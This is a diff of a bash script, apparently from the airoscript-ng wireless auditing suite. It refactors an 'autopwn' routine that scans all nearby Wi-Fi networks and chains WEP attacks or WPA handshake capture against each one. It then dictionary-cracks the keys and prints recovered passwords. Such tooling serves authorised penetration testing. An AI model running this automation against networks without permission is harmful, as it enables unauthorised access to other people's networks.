@@ -19,102 +19,121 @@
     #ap_array=`cat $DUMP_PATH/dump-02.csv | grep -a -n Station | awk -F : '{print $1}'`
     #head -n $ap_array $DUMP_PATH/dump-01.csv &> $DUMP_PATH/dump-02.csv
 
-count_aps(){ a=($(wc -l $DUMP_PATH/dump-02.csv)); echo ${a[0]}; } # benchmarks shows this is a little more efficent than using cut.
+source $path/attacks/others
+source $path/attacks/injection
+source $path/attacks/wpa
+source $path/attacks/auth
+source $path/attacks/wep
+source $path/crack/main
 
-autoscan_autopwn(){
+autopwn(){ func=$1; shift; autopwn_$func $@; }
+
+autopwn_setvars(){
+    source $path/autopwn;
+    attack_functions_wep=(wep_attacks_fakeauto wep_attacks_fakeinteractive wep_attacks_chopchop wep_attacks_caffelate wep_attacks_hirte wep_attacks_arpreplay_auto wep_attacks_arpreplay_interactive wep_attacks_fragmentation wep_attacks_chopchopclient wep_attacks_pskarp)
+    attack_functions_wpa=(wpa_attacks_handshake)
+
+    F=0; export AUTO=$1; export QUIET=1; export INTERACTIVE=0; next=0; count=0;
+    export writekey="-l $DUMP_PATH/$Host_MAC.key"
+    [[ $1 == 1 ]] && export ENCRYPT="";
+}
+
+autopwn_scan(){
     launch_counter $time_to_scan &  
         choosescan # Choose scan in auto auto auto mode.
         sleep $time_to_scan && killall -2 "airodump-ng"; 
     reload_config
-}
-
-doauto(){
-    source $path/autopwn;
-    export F=0; export AUTO=2; export QUIET=1; export INTERACTIVE=0; export ENCRYPT="";  #Set vars to quietest mode.
-
-    autoscan_autopwn;
     cat $DUMP_PATH/dump-01.csv|sed -e '1,/BSSID/ s/.*//' -e '/Station/,$ s/.*//'|tac > $DUMP_PATH/dump-02.csv 2>/dev/null
     filter_ssid
-    MAX_TARGETS=$(count_aps);
+}
+    
+autopwn_selectap(){    
+    export AUTO=2; selectAp;  sleep 1
+}
+
+autopwn_crack(){
+    check_function Crack_with_dictionary_generator && {
+        export wait_for_execute=1; AUTO=1; Crack_with_dictionary_generator autocrack 
+    } || {
+        export wait_for_execute=1; AUTO=1; selectcracking 1; AUTO=0; export wait_for_execute=0;
+    }
+}
+
+count_aps(){ a=($(wc -l $DUMP_PATH/dump-02.csv)); echo ${a[0]}; } # benchmarks shows this is a little more efficent than using cut.
+
+autopwn_runner(){
+    autopwn setvars 1
+    autopwn scan && MAX_TARGETS=$(count_aps);
 
     echo; tag; warn "${mark}Networks detected $MAX_TARGETS"; sleep 1
 
-    for i in `seq 1 $MAX_TARGETS`; do
-	echo
-        tag; warn "${mark}Trying to crack target $i"
-
-        export AUTO=2; selectAp;  sleep 1
-        export writekey="-l $DUMP_PATH/$Host_MAC.key"
-        if [ "$Host_SSID" != "" ]; then autopwn; 
+    for i in `seq 1 $MAX_TARGETS`; do echo
+        autopwn selectap
+        if [ "$Host_SSID" != "" ]; then autopwn network; 
         else tag; warn "${mark}Couldn't find essid, trying with next network."; fi
     done
 
-    tag; warn ${mark}"Cracked networks:"
-    for file in $DUMP_PATH/*.key; do
-        echo "\t${mark}$file : `cat $file`"
-    done
-
-    reload_config
+    autopwn print_cracked_networks
 }
 
-continue_autocrack(){
+autopwn_print_cracked_networks(){
+    [[ $DUMP_PATH/*.key ]] && {
+        tag; warn ${mark}"Cracked networks:"
+        for file in $DUMP_PATH/*.key; do
+            echo "\t${mark}$file : `cat $file`"
+        done
+    }
+}
+
+autopwn_finish(){
     check_function doexit || source $path/internal/exit; 
     [[ $options_autoconfigure ]] && { 
         configure; doexit killme; 
     } || {
-    read -p "Press c to configure, q to quit, n to next network and any key to continue" -s -n1 ans
-    echo $ans; echo; echo
-        [[ "$ans" == "c" ]] && configure; doexit; 
+        read -p "Press c to configure, q to quit, n to next network and any key to get back to main menu" -s -n1 ans
+        [[ "$ans" == "c" ]] && { configure; return 1; }
+    	[[ $ans == "n" ]] && return 0
         [[ $ans == "q" ]] && { 
             warn "${mark}Exiting..."
             doexit killme ;
-		exit; pkill -9 airoscript-ng; killall -9 airoscript-ng
+		    exit; pkill -9 airoscript-ng; killall -9 airoscript-ng
         }
-
-	[[ $ans == "n" ]] && return 1 || return 0
+        return 1
     }
 }
 
-autopwn(){
-    check_function cleanp || source $path/internal/childs
-    attack_functions_wep=(wep_attacks_fakeauto wep_attacks_fakeinteractive wep_attacks_chopchop wep_attacks_caffelate wep_attacks_hirte wep_attacks_arpreplay_auto wep_attacks_arpreplay_interactive wep_attacks_fragmentation wep_attacks_chopchopclient wep_attacks_pskarp)
-    attack_functions_wpa=(wpa_attacks_handshake)
+autopwn_failed_cracking(){
+    warn "${mark}Network NOT cracked. Something failed."
+    [[ "$Host_ENC" =~ (.*)WPA(.*) ]] && warn "${mark}Most probable cause is that network's key is not in the dictionary"
+}
 
-    F=0; export AUTO=1; export QUIET=1; export INTERACTIVE=0; next=0; count=0
+autopwn_network(){
+    autopwn setvars 2
+
     [[ "$Host_ENC" =~ (.*)WPA(.*) ]] && { attack_functions=${attack_functions_wpa[@]}; min_ivs=10; } || attack_functions=${attack_functions_wep}
 
     for i in ${attack_functions[@]}; do
         tag; echo "${mark}Attack $count. Using $i in $Host_MAC"
         { $i & cleanp & get_min_ivs; } &> /dev/null
+
         [[ "$Host_ENC" =~ (.*)WPA(.*) ]] || {  
             tag; warn "${mark}Needed ivs: $min_ivs"
         }
 
         while [ "1" ]; do 
-            sleep 5 && {
-                check_if_worked
-                [[ $? == 0 ]] && { 
-                    echo; tag; warn "${mark}Trying to crack network, we have enough ivs or handshakes.";
-                    cleanautovars;
-
-                    check_function Crack_with_dictionary_generator && {
-                        export wait_for_execute=1; AUTO=1; Crack_with_dictionary_generator autocrack 
-                    } || {
-                        export wait_for_execute=1; AUTO=1; selectcracking 1; AUTO=0; export wait_for_execute=0;
-                    }
-                    cleanautovars;
-                    [[ -e $DUMP_PATH/$Host_MAC.key ]] && warn "${mark}Network cracked, password is  `cat $DUMP_PATH/$Host_MAC.key`" || warn "${mark}Network NOT cracked. Something failed, if your enc is WPA probably key is not in your ~/.airoscript/wordlist.txt"
-
-                    continue_autocrack || break;
-                 } || {
-                    [[ "$Host_ENC" =~ (.*)WPA(.*) ]] && {  
-                        specialwarn "\r\t${mark}Current Handshakes: $handshakes"  ;
-                    } || {
-                        specialwarn "\r\t${mark}Current IVS: `check_all_ivs`"  ;
-                    }
-                }
-            }
+            sleep 5
+            autopwn finished && { 
+                # We have enough ivs
+                echo; tag; warn "${mark}Trying to crack network, we have enough ivs or handshakes.";
+                autopwn crack && autopwn_print_crack_status
+                autopwn finish && break || { break; mainmenu; }
+             } || {
+                # We don't have enough ivs
+                autopwn print_capture_status && { echo; break; } || status=$?
+             }
+            [[ $status == 20 ]] && break
         done
+        [[ $status == 20 ]] && { status=0; break; }
         count=$(( $count + 1 ))
     done
 
@@ -123,6 +142,24 @@ autopwn(){
 
 }
 
+autopwn_print_crack_status(){
+    [[ -e $DUMP_PATH/$Host_MAC.key ]] && \
+        warn "${mark}Network cracked, password is `cat $DUMP_PATH/$Host_MAC.key`" || \
+        autopwn failed_cracking                   
+}
+
+autopwn_print_capture_status(){
+    [[ "$Host_ENC" =~ (.*)WPA(.*) ]] && {  
+        specialwarn "\r\t${mark}Current Handshakes: $handshakes. Press a to go to next attack, m for menu, for next network" ;
+    } || {
+        specialwarn "\r\t${mark}Current IVS: `check_all_ivs`. Press a to go to next attack, m for menu, n for next network"  ;
+    }
+    read -t1 -n1 -p" " ans
+
+    [[ $ans == "m" ]] && { cleanautovars; $clear; mainmenu; ans="a"; }
+    [[ $ans == "k" ]] && return 20
+    [[ $ans == "a" ]]
+}
 check_all_ivs(){  awk "/^$Host_MAC/ { gsub(/,/, \"\", \$14); print \$14; }" ${DUMP_PATH}/${Host_MAC}-01.csv; }
 
 get_min_ivs(){
@@ -142,7 +179,7 @@ check_if_handshake(){
     (( $handshakes > 0 )) && return 0 || return 1
 }
 
-check_if_worked(){
+autopwn_finished(){
     [[ "$Host_ENC" =~ (.*)WPA(.*) ]] && {
         check_if_handshake && {
             tag; warn "${mark}Got WPA handshake ($handshakes eapol packets)"
